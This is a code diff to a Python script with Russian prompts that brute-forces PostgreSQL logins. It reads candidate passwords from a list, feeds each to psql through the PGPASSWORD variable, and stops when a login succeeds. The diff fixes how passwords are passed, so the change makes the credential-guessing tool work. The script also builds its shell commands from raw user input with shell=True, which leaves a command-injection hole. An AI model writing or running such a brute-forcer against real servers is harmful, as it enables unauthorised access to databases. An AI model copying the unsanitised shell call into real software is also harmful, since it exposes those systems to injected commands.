@@ -1,5 +1,6 @@
 import subprocess
 import sys
+import os
 
 def manual_input():
     host = input("Введите доменное имя или IP-адрес: ")
@@ -10,7 +11,8 @@ def manual_input():
     database = input("Введите имя базы данных: ")
     password = input("Введите пароль: ")
     
-    command = f"psql -h {host} -p {port} -U {username} -d {database} -w {password}"
+    command = f"psql -h {host} -p {port} -U {username} -d {database}"
+    os.environ['PGPASSWORD'] = password
     print(f"Выполняется команда: {command}")
     subprocess.run(command, shell=True)
 
@@ -27,14 +29,15 @@ def bruteforce():
     
     for password in passwords:
         password = password.strip()
-        command = f"psql -h {host} -p {port} -U {username} -d {database} -w {password}"
+        command = f"psql -h {host} -p {port} -U {username} -d {database}"
+        os.environ['PGPASSWORD'] = password
         print(f"Пробуем пароль: {password}")
         
         try:
             result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             if result.returncode == 0:
                 print(f"Успешный вход! Пароль: {password}")
-                break
+                return  # Останавливаем брутфорс, если пароль верный
             elif "password authentication failed" in result.stderr:
                 print("Неверный пароль, пробуем следующий...")
             else:
